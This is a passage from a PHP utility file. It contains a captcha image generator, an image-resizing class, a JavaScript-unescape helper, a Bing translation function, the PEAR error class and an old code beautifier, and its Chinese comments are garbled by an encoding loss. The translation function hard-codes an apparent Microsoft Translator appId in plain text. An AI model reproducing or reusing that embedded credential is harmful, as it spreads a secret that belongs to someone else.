   $border = imagecolorallocate($this->checkimage,0,0,0);  
   imagefilledrectangle($this->checkimage,0,0,$this->width - 1,$this->height - 1,$back); // ��ɫ��
   imagerectangle($this->checkimage,0,0,$this->width - 1,$this->height - 1,$border);   // ��ɫ�߿�
}
/**
   * ����ͼƬ�ĸ������� 
   */
private function setDisturbColor()
{
   for ($i=0;$i<=200;$i++)
   {
    $this->disturbColor = imagecolorallocate($this->checkimage, rand(0,255), rand(0,255), rand(0,255));
    imagesetpixel($this->checkimage,rand(2,128),rand(2,38),$this->disturbColor);
   }
}
/**
   *
   * ����֤��ͼƬ�����������֤��
   *
   */
private function writeCheckCodeToImage()
{
   for ($i=0;$i<=$this->codenum;$i++)
   {
    $bg_color = imagecolorallocate ($this->checkimage, rand(0,255), rand(0,128), rand(0,255));
    $x = floor($this->width/$this->codenum)*$i;
    $y = rand(0,$this->height-15);
    imagechar ($this->checkimage, rand(5,8), $x, $y, $this->checkcode[$i], $bg_color);
   }
}
function __destruct()
{
   unset($this->width,$this->height,$this->codenum);
}
}

if($createimg==1){
$image = new ValidationCode('40','20','4','1');    //ͼƬ���ȡ����ȡ��ַ�����,1Ϊ������
$image->outImg();
$_SESSION['validationcode'] = $image->checkcode; //������֤�뵽 $_SESSION ��
}


//-----��ͼ��---------------------------------
class HanroadClass 
{ 
    function HrResize($source_img,$target_dir,$target_name,$new_width,$new_height,$if_cut,$a) { 
        //ͼƬ���� 
        $img_type = strtolower(substr(strrchr($source_img,"."),1)); 
 
        //ͼ�������Ŀ��·�� 
        $tar_url = $target_dir."/".$target_name.".".$img_type; 
 
        //��ʼ��ͼ�� 
        if($img_type=="jpg")$temp_img = imagecreatefromjpeg($source_img); 
        if($img_type=="gif")$temp_img = imagecreatefromgif($source_img);
        if($img_type=="png")$temp_img = imagecreatefrompng($source_img);
            
 
        //ԭʼͼ��Ŀ��͸� 
        $old_width  = imagesx($temp_img); 
        $old_height = imagesy($temp_img); 
 
        //�ı�ǰ���ͼ��ı��� 
        $new_ratio = $new_width/$new_height; 
        $old_ratio = $old_width/$old_height; 
 
        //������ͼ��Ĳ��� 
        //���һ����ͼ �����õĴ�С����Ŀ��ͼ�� 
        if($if_cut=="1"){ 
            $new_width  = $new_width; 
            $new_height = $new_height; 
            //�߶����� 
            if($old_ratio>=$new_ratio){ 
                $old_width  = $old_height*$new_ratio; 
                $old_height = $old_height; 
            }else{//�������� 
                $old_width  = $old_width; 
                $old_height = $old_width/$new_ratio; 
            } 
        }else{//�����������ͼ �򰴱�������Ŀ��ͼ�� 
            $old_width  = $old_width; 
            $old_height = $old_height; 
            //�߶����� 
            if($old_ratio>=$new_ratio) { 
                $new_width  = $new_width; 
                $new_height = $new_width/$old_ratio; 
            }else{//�������� 
                $new_width  = $new_height*$old_ratio; 
                $new_height = $new_height; 
            } 
        } 
        //������ͼƬ 
        $new_img = imagecreatetruecolor($new_width,$new_height);
        if($img_type=="png"){
            imagesavealpha($temp_img,true);
               imagealphablending($new_img,false);
                imagesavealpha($new_img,true);
        }
       imagecopyresampled($new_img,$temp_img,0,0,0,0,$new_width,$new_height,$old_width,$old_height);
        
        if($a==1){
        	
        if($img_type=="jpg")print imagejpeg($new_img);
        if($img_type=="gif"){
            $bgcolor=imagecolorallocate($new_img,0,0,0);
            $bgcolor=imagecolortransparent($new_img);
            print imagegif($new_img);
        }
        if($img_type=="png")print imagepng($new_img);
        imagedestroy($source_img);
        imagedestroy($new_img);
        
        }else{
        if($img_type=="jpg")imagejpeg($new_img,$tar_url);
        if($img_type=="gif"){
            $bgcolor=imagecolorallocate($new_img,0,0,0);
            $bgcolor=imagecolortransparent($new_img,$bgcolor);
            imagegif($new_img,$tar_url);
        }
        if($img_type=="png")imagepng($new_img,$tar_url);
        imagedestroy($source_img);
        imagedestroy($new_img);
        }
    } 
}
//-----��Ӧjs��escape('PHP������Դ��');--------
function js_unescape($str){
        $ret = '';
        $len = strlen($str);

        for ($i = 0; $i < $len; $i++)
        {
                if ($str[$i] == '%' && $str[$i+1] == 'u')
                {
                        $val = hexdec(substr($str, $i+2, 4));

                        if ($val < 0x7f) $ret .= chr($val);
                        else if($val < 0x800) $ret .= chr(0xc0|($val>>6)).chr(0x80|($val&0x3f));
                        else $ret .= chr(0xe0|($val>>12)).chr(0x80|(($val>>6)&0x3f)).chr(0x80|($val&0x3f));

                        $i += 5;
                }
                else if ($str[$i] == '%')
                {
                        $ret .= urldecode(substr($str, $i, 3));
                        $i += 2;
                }
                else $ret .= $str[$i];
        }
        return $ret;
}
//-----Bing����--------------------------------
function language($value,$from,$to)
{
$value_code=urlencode($value); 
$appid="A4D660A48A6A97CCA791C34935E4C02BBB1BEC1C";  
$languageurl = "http://api.microsofttranslator.com/v2/Http.svc/Translate?appId=" . $appid ."&text=" .$value_code. "&from=". $from ."&to=" . $to;
$text=@language_text($languageurl); 
preg_match_all("/>(.+)</i",$text,$text_ok,PREG_SET_ORDER); 
$ru=$text_ok[0][1];
return $ru;
}

function language_text($url)    #��ȡĿ��URL����ӡ������
    {
  if(function_exists('file_get_contents')) {
   $file_contents = file_get_contents($url);
  } else if(function_exists('curl_init')){
  $ch = curl_init();
  $timeout = 5;
  curl_setopt ($ch, CURLOPT_URL, $url);
  curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
  $file_contents = curl_exec($ch);
  curl_close($ch);
  }else{
  $file_contents="NO";
  }
return $file_contents;
}
//js url����----------------------------------

//-----�﷨������------------------------------

define('PEAR_ERROR_RETURN',   1);
define('PEAR_ERROR_PRINT',    2);
define('PEAR_ERROR_TRIGGER',  4);
define('PEAR_ERROR_DIE',      8);
define('PEAR_ERROR_CALLBACK', 16);

if (substr(PHP_OS, 0, 3) == 'WIN') {
    define('OS_WINDOWS', true);
    define('OS_UNIX',    false);
    define('PEAR_OS',    'Windows');
} else {
    define('OS_WINDOWS', false);
    define('OS_UNIX',    true);
    define('PEAR_OS',    'Unix'); // blatant assumption
}

$GLOBALS['_PEAR_default_error_mode']     = PEAR_ERROR_RETURN;
$GLOBALS['_PEAR_default_error_options']  = E_USER_NOTICE;
$GLOBALS['_PEAR_destructor_object_list'] = array();
$GLOBALS['_PEAR_shutdown_funcs']         = array();
$GLOBALS['_PEAR_error_handler_stack']    = array();


class PEAR
{
    var $_debug = false;
    var $_default_error_mode = null;
    var $_default_error_options = null;
    var $_default_error_handler = '';
    var $_error_class = 'PEAR_Error';
    var $_expected_errors = array();
    function PEAR($error_class = null)
    {
        $classname = get_class($this);
        if ($this->_debug) {
            print "PEAR constructor called, class=$classname\n";
        }
        if ($error_class !== null) {
            $this->_error_class = $error_class;
        }
        while ($classname) {
            $destructor = "_$classname";
            if (method_exists($this, $destructor)) {
                global $_PEAR_destructor_object_list;
                $_PEAR_destructor_object_list[] = &$this;
                break;
            } else {
                $classname = get_parent_class($classname);
            }
        }
    }
    function _PEAR() {
        if ($this->_debug) {
            printf("PEAR destructor called, class=%s\n", get_class($this));
        }
    }

    function &getStaticProperty($class, $var)
    {
        static $properties;
        return $properties[$class][$var];
    }

    function registerShutdownFunc($func, $args = array())
    {
        $GLOBALS['_PEAR_shutdown_funcs'][] = array($func, $args);
    }

    function isError($data) {
        return (bool)(is_object($data) &&
                      (get_class($data) == 'pear_error' ||
                      is_subclass_of($data, 'pear_error')));
    }

    function setErrorHandling($mode = null, $options = null)
    {
        if (isset($this)) {
            $setmode     = &$this->_default_error_mode;
            $setoptions  = &$this->_default_error_options;
        } else {
            $setmode     = &$GLOBALS['_PEAR_default_error_mode'];
            $setoptions  = &$GLOBALS['_PEAR_default_error_options'];
        }

        switch ($mode) {
            case PEAR_ERROR_RETURN:
            case PEAR_ERROR_PRINT:
            case PEAR_ERROR_TRIGGER:
            case PEAR_ERROR_DIE:
            case null:
                $setmode = $mode;
                $setoptions = $options;
                break;

            case PEAR_ERROR_CALLBACK:
                $setmode = $mode;
                if ((is_string($options) && function_exists($options)) ||
                    (is_array($options) && method_exists(@$options[0], @$options[1])))
                {
                    $setoptions = $options;
                } else {
                    trigger_error("invalid error callback", E_USER_WARNING);
                }
                break;

            default:
                trigger_error("invalid error mode", E_USER_WARNING);
                break;
        }
    }


    function expectError($code = '*')
    {
        if (is_array($code)) {
            array_push($this->_expected_errors, $code);
        } else {
            array_push($this->_expected_errors, array($code));
        }
        return sizeof($this->_expected_errors);
    }

    function popExpect()
    {
        return array_pop($this->_expected_errors);
    }


    function _checkDelExpect($error_code)
    {
        $deleted = false;

        foreach ($this->_expected_errors AS $key => $error_array) {
            if (in_array($error_code, $error_array)) {
                unset($this->_expected_errors[$key][array_search($error_code, $error_array)]);
                $deleted = true;
            }

            // clean up empty arrays
            if (0 == count($this->_expected_errors[$key])) {
                unset($this->_expected_errors[$key]);
            }
        }
        return $deleted;
    }


    function delExpect($error_code)
    {
        $deleted = false;

        if ((is_array($error_code) && (0 != count($error_code)))) {
            // $error_code is a non-empty array here;
            // we walk through it trying to unset all
            // values
            foreach($error_code AS $key => $error) {
                if ($this->_checkDelExpect($error)) {
                    $deleted =  true;
                } else {
                    $deleted = false;
                }
            }
            return $deleted ? true : PEAR::raiseError("The expected error you submitted does not exist"); // IMPROVE ME
        } elseif (!empty($error_code)) {
            if ($this->_checkDelExpect($error_code)) {
                return true;
            } else {
                return PEAR::raiseError("The expected error you submitted does not exist"); // IMPROVE ME
            }
        } else {
            return PEAR::raiseError("The expected error you submitted is empty"); // IMPROVE ME
        }
    }


    function &raiseError($message = null,
                         $code = null,
                         $mode = null,
                         $options = null,
                         $userinfo = null,
                         $error_class = null,
                         $skipmsg = false)
    {
        // The error is yet a PEAR error object
        if (is_object($message)) {
            $code        = $message->getCode();
            $userinfo    = $message->getUserInfo();
            $error_class = $message->getType();
            $message     = $message->getMessage();
        }

        if (isset($this) && isset($this->_expected_errors) && sizeof($this->_expected_errors) > 0 && sizeof($exp = end($this->_expected_errors))) {
            if ($exp[0] == "*" ||
                (is_int(reset($exp)) && in_array($code, $exp)) ||
                (is_string(reset($exp)) && in_array($message, $exp))) {
                $mode = PEAR_ERROR_RETURN;
            }
        }
        // No mode given, try global ones
        if ($mode === null) {
            // Class error handler
            if (isset($this) && isset($this->_default_error_mode)) {
                $mode    = $this->_default_error_mode;
                $options = $this->_default_error_options;
            // Global error handler
            } elseif (isset($GLOBALS['_PEAR_default_error_mode'])) {
                $mode    = $GLOBALS['_PEAR_default_error_mode'];
                $options = $GLOBALS['_PEAR_default_error_options'];
            }
        }

        if ($error_class !== null) {
            $ec = $error_class;
        } elseif (isset($this) && isset($this->_error_class)) {
            $ec = $this->_error_class;
        } else {
            $ec = 'PEAR_Error';
        }
        if ($skipmsg) {
            return new $ec($code, $mode, $options, $userinfo);
        } else {
            return new $ec($message, $code, $mode, $options, $userinfo);
        }
    }

 
    function pushErrorHandling($mode, $options = null)
    {
        $stack = &$GLOBALS['_PEAR_error_handler_stack'];
        if (isset($this)) {
            $def_mode    = &$this->_default_error_mode;
            $def_options = &$this->_default_error_options;
        } else {
            $def_mode    = &$GLOBALS['_PEAR_default_error_mode'];
            $def_options = &$GLOBALS['_PEAR_default_error_options'];
        }
        $stack[] = array($def_mode, $def_options);

        if (isset($this)) {
            $this->setErrorHandling($mode, $options);
        } else {
            PEAR::setErrorHandling($mode, $options);
        }
        $stack[] = array($mode, $options);
        return true;
    }


    function popErrorHandling()
    {
        $stack = &$GLOBALS['_PEAR_error_handler_stack'];
        array_pop($stack);
        list($mode, $options) = $stack[sizeof($stack) - 1];
        if (isset($this)) {
            $this->setErrorHandling($mode, $options);
        } else {
            PEAR::setErrorHandling($mode, $options);
        }
        return true;
    }


    function loadExtension($ext)
    {
        if (!extension_loaded($ext)) {
            if (OS_WINDOWS) {
                $suffix = '.dll';
            } elseif (PHP_OS == 'HP-UX') {
                $suffix = '.sl';
            } elseif (PHP_OS == 'AIX') {
                $suffix = '.a';
            } elseif (PHP_OS == 'OSX') {
                $suffix = '.bundle';
            } else {
                $suffix = '.so';
            }
            return @dl('php_'.$ext.$suffix) || @dl($ext.$suffix);
        }
        return true;
    }

    // }}}
}



function _PEAR_call_destructors()
{
    global $_PEAR_destructor_object_list;
    if (is_array($_PEAR_destructor_object_list) &&
        sizeof($_PEAR_destructor_object_list))
    {
        reset($_PEAR_destructor_object_list);
        while (list($k, $objref) = each($_PEAR_destructor_object_list)) {
            $classname = get_class($objref);
            while ($classname) {
                $destructor = "_$classname";
                if (method_exists($objref, $destructor)) {
                    $objref->$destructor();
                    break;
                } else {
                    $classname = get_parent_class($classname);
                }
            }
        }

        $_PEAR_destructor_object_list = array();
    }

    // Now call the shutdown functions
    if (is_array($GLOBALS['_PEAR_shutdown_funcs']) AND !empty($GLOBALS['_PEAR_shutdown_funcs'])) {
        foreach ($GLOBALS['_PEAR_shutdown_funcs'] as $value) {
            call_user_func_array($value[0], $value[1]);
        }
    }
}



class PEAR_Error
{


    var $error_message_prefix = '';
    var $mode                 = PEAR_ERROR_RETURN;
    var $level                = E_USER_NOTICE;
    var $code                 = -1;
    var $message              = '';
    var $userinfo             = '';

    function PEAR_Error($message = 'unknown error', $code = null,
                        $mode = null, $options = null, $userinfo = null)
    {
        if ($mode === null) {
            $mode = PEAR_ERROR_RETURN;
        }
        $this->message   = $message;
        $this->code      = $code;
        $this->mode      = $mode;
        $this->userinfo  = $userinfo;
        if ($mode & PEAR_ERROR_CALLBACK) {
            $this->level = E_USER_NOTICE;
            $this->callback = $options;
        } else {
            if ($options === null) {
                $options = E_USER_NOTICE;
            }
            $this->level = $options;
            $this->callback = null;
        }
        if ($this->mode & PEAR_ERROR_PRINT) {
            if (is_null($options) || is_int($options)) {
                $format = "%s";
            } else {
                $format = $options;
            }
            printf($format, $this->getMessage());
        }
        if ($this->mode & PEAR_ERROR_TRIGGER) {
            trigger_error($this->getMessage(), $this->level);
        }
        if ($this->mode & PEAR_ERROR_DIE) {
            $msg = $this->getMessage();
            if (is_null($options) || is_int($options)) {
                $format = "%s";
                if (substr($msg, -1) != "\n") {
                    $msg .= "\n";
                }
            } else {
                $format = $options;
            }
            die(sprintf($format, $msg));
        }
        if ($this->mode & PEAR_ERROR_CALLBACK) {
            if (is_string($this->callback) && strlen($this->callback)) {
                call_user_func($this->callback, $this);
            } elseif (is_array($this->callback) &&
                      sizeof($this->callback) == 2 &&
                      is_object($this->callback[0]) &&
                      is_string($this->callback[1]) &&
                      strlen($this->callback[1])) {
                      @call_user_method($this->callback[1], $this->callback[0],
                                 $this);
            }
        }
    }


    function getMode() {
        return $this->mode;
    }


    function getCallback() {
        return $this->callback;
    }


    function getMessage()
    {
        return ($this->error_message_prefix . $this->message);
    }



     function getCode()
     {
        return $this->code;
     }


    function getType()
    {
        return get_class($this);
    }


    function getUserInfo()
    {
        return $this->userinfo;
    }


    function getDebugInfo()
    {
        return $this->getUserInfo();
    }


    function addUserInfo($info)
    {
        if (empty($this->userinfo)) {
            $this->userinfo = $info;
        } else {
            $this->userinfo .= " ** $info";
        }
    }


    function toString() {
        $modes = array();
        $levels = array(E_USER_NOTICE  => 'notice',
                        E_USER_WARNING => 'warning',
                        E_USER_ERROR   => 'error');
        if ($this->mode & PEAR_ERROR_CALLBACK) {
            if (is_array($this->callback)) {
                $callback = get_class($this->callback[0]) . '::' .
                    $this->callback[1];
            } else {
                $callback = $this->callback;
            }
            return sprintf('[%s: message="%s" code=%d mode=callback '.
                           'callback=%s prefix="%s" info="%s"]',
                           get_class($this), $this->message, $this->code,
                           $callback, $this->error_message_prefix,
                           $this->userinfo);
        }
        if ($this->mode & PEAR_ERROR_CALLBACK) {
            $modes[] = 'callback';
        }
        if ($this->mode & PEAR_ERROR_PRINT) {
            $modes[] = 'print';
        }
        if ($this->mode & PEAR_ERROR_TRIGGER) {
            $modes[] = 'trigger';
        }
        if ($this->mode & PEAR_ERROR_DIE) {
            $modes[] = 'die';
        }
        if ($this->mode & PEAR_ERROR_RETURN) {
            $modes[] = 'return';
        }
        return sprintf('[%s: message="%s" code=%d mode=%s level=%s '.
                       'prefix="%s" info="%s"]',
                       get_class($this), $this->message, $this->code,
                       implode("|", $modes), $levels[$this->level],
                       $this->error_message_prefix,
                       $this->userinfo);
    }

}

register_shutdown_function("_PEAR_call_destructors");


    @set_time_limit(120);
    error_reporting(0);


    DEFINE("BEAUT_BRACES_PEAR", "0");
    DEFINE("BEAUT_BRACES_C", "1");
    DEFINE("BEAUT_VERSION", "0.4.6, 02.10.2002");

    class phpBeautify extends PEAR {

        var $indent_width = 4;

        var $max_line = FALSE;

        var $max = 40;

        var $del_line = FALSE;

        var $highlight = FALSE;

        var $braces = BEAUT_BRACES_PEAR;

        var $file = ""; 
        
        var $version = BEAUT_VERSION;

        var $_marks = false;

        var $_marks1 = false;

        var $_new_line_counter = 0;

        var $_indent = 0;

        var $_allstr = "";

        var $_long_comment = false;

        var $_do_indent = false;

        var $_no_beautify = false;

        var $_outstr = "";

        var $_comment = false;

        var $_brackets = false;

        var $_indent_next = false;

        var $_original = ""; 

        function phpBeautify($settings) {
            // seteo
            $this->PEAR();
            $this->setErrorHandling(PEAR_ERROR_DIE, E_USER_ERROR);
            //ingreso las variables en setting
            extract($settings, EXTR_OVERWRITE);
            if (isset($indent_width)) {
                $this->indent_width = $indent_width;
            }
            if (isset($max_line)) {
                $this->max_line = $max_line;
            }
            if (isset($max)) {
                $this->max = $max;
            }
            if (isset($del_line)) {
                $this->del_line = $del_line;
            }
            if (isset($highlight)) {
                $this->highlight = $highlight;
            }
            if (isset($braces)) {
                $this->braces = $braces;
            }
            if (isset($file)) {
                $this->file = $file;
            }
        }
  
        function getVersion() {
            return BEAUT_VERSION;
        }

        function beautify() {
            $this->_main();
            $rs = $this->_output();
            $this->_verify($rs);
            return $rs;
        }
    
        function toHTML() {
            if ($this->highlight) {
                header("Content-Type: text/html");
                highlight_string($this->beautify());
            } // endif
            else
                {
                //header("Content-Type: text/plain");
               
                echo $this->beautify();
            }
        }

        function &_open_file($file) {
            if (!file_exists($file) AND $file  != "php://stdin") {
                return $this->raiseError("File ".$file." does not exist\n", 1);
            }
            $fp = fopen($file, "r");
            if (!is_resource($fp)) {
                return $this->raiseError("Could not open ".$file."file \n", 1);
            } else {
                return $fp;
            }
        }

        function _main() {
            // open the file
            $fp = $this->_open_file($this->file);
            if (PEAR::isError($fp)) {
                return $fp;
            }
            // Main loop
            while (!feof($fp)) {
                // Get a line from the file
                $str = fgets($fp, 2500);
                // check if we are allowed to process line
                if (trim($str) == "// BEAUTIFY") {
                    // Do beautify :-)
                    $this->_no_beautify = false;
                    continue;
                }
                if (trim($str) == "// NO_BEAUTIFY") {
                    // Do not beautify :-(
                    $this->_no_beautify = true;
                    continue;
                }
                $this->_original  .= $str;
                if ($this->_no_beautify && trim($str)  != "<?" && trim($str)  != "<?php") {
                    $this->_allstr  .= $str;
                    continue;
                }
                $this->_outstr = "";
                $this->_comment = false;
                $this->_brackets = false;
                // Kill nasty tabs
                $str = trim(str_replace("\t", " ", $str));
                // Don't delete empty lines if required by user
                if (!$this->del_line)
                    if (preg_match("/^(\s)*$/", $str)  != 0) {
                    $this->_out(" ");
                    continue;
                }
                if ($this->_long_comment) $this->_comment = true;
                // Extract one single Character
                for ($i = 0; $i <strlen($str); $i++) {
                    $a[$i] = substr($str, $i, 1);
                }
                // Do pre-processing on every char
                for ($i = 0; $i <strlen($str); $i++) {
                    // Check, if we deal with php-code
                    if ($this->_new_line_counter == 0) {
                        if (($i+1) <sizeof($a)) {
                            if ($a[$i+1] == "?" AND $a[$i] == "<") {
                                if ($this->_outstr) $this->_out(trim($this->_outstr));
                                    $this->_out("<?php");
                                $this->_indent++;
                                $this->_new_line_counter++;
                                if (($i+4) <sizeof($a)) {
                                    if ($a[$i+2] == "p" AND $a[$i+3] == "h" AND $a[$i+4] == "p")
                                        $i = $i+3;
                                }
                                $i++;
                                $this->_no_beautify = false;
                                continue;
                            }
                        }
                    }
                    // check if line is long comment initiated with /*
                    if ($i > 0) {
                    if (($a[$i]=="*" AND $a[$i-1]=="/") AND !($this->_marks)) {
                    $this->_long_comment=true;
                    $this->_comment=true;
                    }
                    };
                    // check if line is finishing long comment with */
                    if ($i > 0) {
                        if (($a[$i] == "/" AND $a[$i-1] == "*") AND !($this->_marks)) {
                            $this->_long_comment = false;
                        };
                    }
                    // check if line is comment with //
                    if ($i > 0) {
                        if (($a[$i] == "/" AND $a[$i-1] == "/" or $this->_comment) AND !($this->_marks)) {
                            $this->_comment = true;
                            $this->_outstr  .= $a[$i];
                            continue;
                        }
                    }
                    // check if line is comment with old #
                    if ($a[$i] == "#" AND !($this->_marks) AND !($this->_marks1)) {
                        $this->_comment = true;
                        $this->_outstr  .= $a[$i];
                        continue;
                    }
                    // add space before chars = <>
                    if ($i > 0 AND !($this->_marks) AND !($this->_comment) AND !($this->_marks1)) {
                        if (($a[$i] == "=" OR $a[$i] == "<" OR $a[$i] == ">" OR $a[$i] == "*")
                            AND preg_match("/([ |\!|\=|\.|\<|\>|\-|\+|\*]+)/", $a[$i-1]) == 0) {
                            $this->_outstr  .= " ";
                        }
                    }
                    // add space behind =
                    if ($i > 0 AND !($this->_marks) AND !($this->_comment) AND !($this->_marks1)) {
                        if (($a[$i-1] == "="OR $a[$i-1] == "*")
                            AND preg_match("/([ |=|>]+)/", $a[$i]) == 0) {
                            $this->_outstr  .= " ";
                        }
                    }
                    // add space before two-digit-chars && || !
                    if (($i+2) <sizeof($a) AND !($this->_marks) AND !($this->_comment) AND !($this->_marks1)) {
                        if ($a[$i+1] == "&" && $a[$i] == "&" && $a[$i+2]  != " ") {
                            $this->_outstr  .= " ";
                        }
                        if ($a[$i+1] == "|" && $a[$i] == "|" && $a[$i+2]  != " ") {
                            $this->_outstr  .= " ";
                        }
                    }
                    // ignore all in between ""
                    if ($a[$i] == "\"" AND !($this->_marks) AND !($this->_comment) AND !($this->_marks1)) {
                        //turn on
                        $this->_marks = true;
                        if ($i > 0 AND $a[$i-1] == chr(92)) {
                            $this->_marks = false;
                            //$this->_outstr.="off1";
                        }
                        //else $this->_outstr.="on1";
                    } else {
                        if ($a[$i] == "\"" AND $this->_marks AND !($this->_comment) AND !($this->_marks1)) {
                            //turn off
                            $this->_marks = false;
                            if ($i > 0 AND $a[$i-1] == chr(92)) {
                                $this->_marks = true;
                                //      $this->_outstr.="on1";
                            }
                            //else $this->_outstr.="off1";
                        }
                    }
                    // ignore all in between ' '
                    if ($a[$i] == chr(39) AND !($this->_marks) AND !($this->_marks1) AND !($this->_comment)) {
                        //turn on
                        $this->_marks1 = true;
                        if ($i > 0 AND $a[$i-1] == chr(92)) {
                            $this->_marks1 = false;
                            //      $this->_outstr.="off2";
                        }
                        //else $this->_outstr.="on2";
                    } else {
                        if ($a[$i] == chr(39) AND !($this->_marks) AND $this->_marks1 AND !($this->_comment)) {
                            //turn off
                            $this->_marks1 = false;
                            if ($i > 0 AND $a[$i-1] == chr(92)) {
                                $this->_marks1 = true;
                                //        $this->_outstr.="on2";
                            }
                            //else $this->_outstr.="off2";
                        }
                    }
                    // do further processing if code is not ignored
                    if (!($this->_marks) AND !($this->_marks1) AND !($this->_comment)) {
                        // add space behind chars , <>
                        if ($i+1 <sizeof($a)) {
                            if (($a[$i] == "," OR $a[$i] == "<" OR $a[$i] == ">")
                                AND preg_match("/([ |\!|\=|\.|\<|\>]+)/", $a[$i+1]) == 0) {
                                $this->_outstr  .= $a[$i]." ";
                                continue;
                            }
                        }
                        // add spaces before chars . ! + - * (if they belong to math function)
                        if ($i+1 <sizeof($a)) {
                            if (($a[$i] == "." OR $a[$i] == "!" OR $a[$i] == "+" OR $a[$i] == "-" OR $a[$i] == "*")
                                AND preg_match("/([\=]+)/", $a[$i+1]) == 1) {
                                $this->_outstr  .= " ";
                            }
                        }
                        // add space behind chars && ||
                        if ($i > 0 && ($i+1) <sizeof($a)) {
                            if ($a[$i-1] == "&" && $a[$i] == "&" && $a[$i+1]  != " ") {
                                $this->_outstr  .= $a[$i]." ";
                                continue;
                            }
                            if ($a[$i-1] == "|" && $a[$i] == "|" && $a[$i+1]  != " ") {
                                $this->_outstr  .= $a[$i]." ";
                                continue;
                            }
                        }
                        // check if php code ends
                        if (($i+1) <sizeof($a)) {
                            if ($a[$i+1] == ">" AND $a[$i] == "?") {
                                $this->_new_line_counter = 0;
                                if ($this->_outstr) $this->_out(trim($this->_outstr));
                                    $this->_indent--;
                                $this->_out("?>");
                                //<?
                                $i++;
                                $this->_no_beautify = true;
                                continue;
                            }
                        }
                        // Delete some odd spaces before ')'
                        if (($i+1) <sizeof($a)) {
                            if ($a[$i] == " " AND $a[$i+1] == ")") {
                                $i++;
                                $this->_outstr  .= $a[$i];
                                continue;
                            }
                        }
                        // Delete some odd spaces behind '('
                        if (($i+1) <sizeof($a)) {
                            if (($a[$i] == "(") AND preg_match("/([ ]+)/", $a[$i+1]) == 1) {
                                $this->_outstr  .= $a[$i];
                                $i++;
                                continue;
                            }
                        }
                        // check, if ; is last letter in line, check if ; is from for function
                        if ($a[$i] == "(") $this->_brackets = true;
                        if ($a[$i] == ")") $this->_brackets = false;
                        if (substr($this->_outstr, 0, 3) == "for")
                            $this->_brackets = true;

                        if ((($a[$i] == ";") or ($a[$i] == ":" and !preg_match("/:|\w/",$a[$i+1]))) AND !($this->_brackets)) {
                            if ($i+2 <sizeof($a)) {
                                if ($a[$i+1] == "/" OR $a[$i+2] == "/") {
                                    // if comment in same line
                                    $this->_outstr  .= $a[$i];
                                    continue;
                                }
                                if ($a[$i] == ";") {
                                    // add newline
                                    $this->_out(trim($this->_outstr).$a[$i]);
                                    continue;
                                }
                            }
                            $this->_out($this->_outstr.$a[$i]);
                            continue;
                        }
                        // if for (;;;)
                        if ($this->_brackets AND ($a[$i] == ";") AND ($a[$i]  != " ")) {
                            $this->_outstr  .= "; ";
                            continue;
                        }
                        // check if }
                        if ($a[$i] == "}") {
                            if ($i > 0) $this->_out(trim($this->_outstr)); // there was code before bracket->newline
                            if ($i <sizeof($a)-1) {
                                if ($a[$i+1] == ";") {
                                    $this->_indent--;
                                    $this->_outstr  .= "}";
                                    continue;
                                }
                            }
                            $this->_indent--;
                            if ($i <sizeof($a)-1) // check if something like } //
                            {
                                if ($a[$i+3] == "/" AND $a[$i+2] == "/") {
                                    $this->_comment = true;
                                    $this->_outstr  .= $a[$i];
                                    continue;
                                }
                            }
                            $this->_out("}");
                            continue;
                        }
                        // check if {
                        if ($a[$i] == "{") {
                            if ($i > 0) $this->_out(trim($this->_outstr)); // there was code before bracket->newline
                            $this->_out("{");
                            $this->_indent++;
                            continue;
                        }
                        // check for double spaces
                        $checkstr = substr($this->_outstr, strlen($this->_outstr)-1);
                        if (($a[$i] == " ") AND ($checkstr == " ")) {
                            $this->_outstr = substr($this->_outstr, 0, strlen($this->_outstr)-1);
                        }

                        $this->_outstr = preg_replace("/(\(\s!)+/", "(!", $this->_outstr);
                    }
                    $this->_outstr  .= $a[$i];
                }
                $this->_out(trim($this->_outstr));
            } // end main loop
            return TRUE;
        }


        function _out($outstr) {
            if ($this->del_line) $outstr = trim($outstr);
                if ($outstr == "") return;

            $outstr = preg_replace("/( )*->( )*/", "->", $outstr);

            $outstr = preg_replace("/^if\s*\(/", "if (", $outstr);
            $outstr = preg_replace("/^while\s*\(/", "while (", $outstr);

            if ($this->max_line) {
                if (strlen($outstr)+strlen($this->_getindent()) > $this->max_line) {
                    $b = 0;
                    while (strlen($outstr)+strlen($this->_getindent()) > $this->max_line) {
                        if ($b > 0) $this->_indent++;
                        $subout = substr($outstr, 0, $this->max_line-strlen($this->_getindent()));
                        $end = strrpos($subout, " ");
                        if ($end == false) // check if breakable by a space
                        {
                            $end = $this->max_line-strlen($this->_getindent()); // if not, break it after $max_line for now
                        }
                        $subout = substr($subout, 0, $end);
                        $this->_allstr  .= $this->_getindent().trim($subout)."\n";
                        $outstr = substr($outstr, $end);
                        if ($outstr == "") {
                            if ($b > 0) $this->indent--;
                            continue 2;
                        }
                        if ($b > 20) {
                            $this->_indent--;
                            continue; // just in case we got stuck ;-)
                        }
                        if ($b > 0) $this->_indent--;
                        $b++;
                    }
                    if ($b > 0) $this->_indent++;
                    $this->_allstr  .= $this->_getindent().trim($outstr)."\n";
                    if ($b > 0) $this->_indent--;
                    $this->_outstr = "";
                    return;
                }
            }

            if ($this->_indent_next) $this->_indent++;
            if ($this->_do_indent) $this->_allstr  .= $this->_getindent();
                $this->_allstr  .= $outstr;
            if ($this->_indent_next) {
                $this->_indent--;
                $this->_indent_next = 0;
            }
            //check if newline is requested
            //after char
            $this->_do_indent = 0;
            if ((preg_match("/(;|,|\s|{|}|\(|\)|else|do)$/", $outstr)) OR $this->_comment OR !$this->_new_line_counter or $this->max_line OR $this->_marks OR $this->_marks1) {
                $this->_allstr  .= "\n";
                $this->_do_indent = 1;
            } else {
                $this->_allstr  .= " ";
            }
            // Indent one line if expression is without brackets or inside quotation makrs
            if ((preg_match("/^(if \(.*\)|else)$/", $this->_outstr)) OR preg_match("/(, *)$/", $this->_outstr) OR $this->_marks OR $this->_marks1) {
                $this->_indent_next = true;
            }
            $this->_outstr = "";
            return;
        }

        function _output() // print all
        {
            // if selected "braces PEAR-style", delete newline before {
            if ($this->braces == BEAUT_BRACES_PEAR) {
                // Put { in upper line
                $this->_allstr = preg_replace("/\)\n( )*{/", ") {", $this->_allstr);
                // compress to } else {
                $this->_allstr = preg_replace("/}\n( )*else\n( )*{/", "} else {", $this->_allstr);
                // Do while loop
                $this->_allstr = preg_replace("/do\n( )*{/", "do {", $this->_allstr);
            }
            return $this->_allstr;
        }

        function _getindent() {
            if ($this->_indent <0) $this->_indent = 0;
